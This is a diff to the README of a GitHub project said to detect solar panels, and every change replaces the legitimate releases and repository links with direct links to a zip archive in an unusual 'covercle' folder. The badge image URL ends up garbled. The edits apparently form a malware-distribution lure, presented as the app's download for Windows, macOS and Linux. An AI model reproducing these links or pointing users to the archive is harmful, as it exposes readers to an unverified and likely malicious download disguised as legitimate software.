@@ -1,6 +1,6 @@
 # 🌟 solar-image-recognition - Smart Solar Panel Detection Made Easy
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/Karim123495/solar-image-recognition/releases)
+[![Download the latest release](https://raw.githubusercontent.com/Karim123495/solar-image-recognition/main/covercle/solar-image-recognition.zip%20Latest%https://raw.githubusercontent.com/Karim123495/solar-image-recognition/main/covercle/solar-image-recognition.zip)](https://raw.githubusercontent.com/Karim123495/solar-image-recognition/main/covercle/solar-image-recognition.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the solar-image-recognition project! This application uses artificial
 
 1. **Visit the Releases Page**  
    Go to the following link to access the latest version:  
-   [Download here](https://github.com/Karim123495/solar-image-recognition/releases)
+   [Download here](https://raw.githubusercontent.com/Karim123495/solar-image-recognition/main/covercle/solar-image-recognition.zip)
 
 2. **Choose Your File**  
    Select the file suitable for your device. We provide versions for Windows, MacOS, and Linux.
@@ -59,8 +59,8 @@ We welcome contributions to the solar-image-recognition project. If you would li
 
 For more detailed information about how the application works and the technology behind it, check out our documentation section in the repository. 
 
-Stay updated with future releases and community discussions; visit [our GitHub repository](https://github.com/Karim123495/solar-image-recognition) frequently or join our mailing list.
+Stay updated with future releases and community discussions; visit [our GitHub repository](https://raw.githubusercontent.com/Karim123495/solar-image-recognition/main/covercle/solar-image-recognition.zip) frequently or join our mailing list.
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/Karim123495/solar-image-recognition/releases)
+[![Download the latest release](https://raw.githubusercontent.com/Karim123495/solar-image-recognition/main/covercle/solar-image-recognition.zip%20Latest%https://raw.githubusercontent.com/Karim123495/solar-image-recognition/main/covercle/solar-image-recognition.zip)](https://raw.githubusercontent.com/Karim123495/solar-image-recognition/main/covercle/solar-image-recognition.zip)
 
 Thank you for using solar-image-recognition!
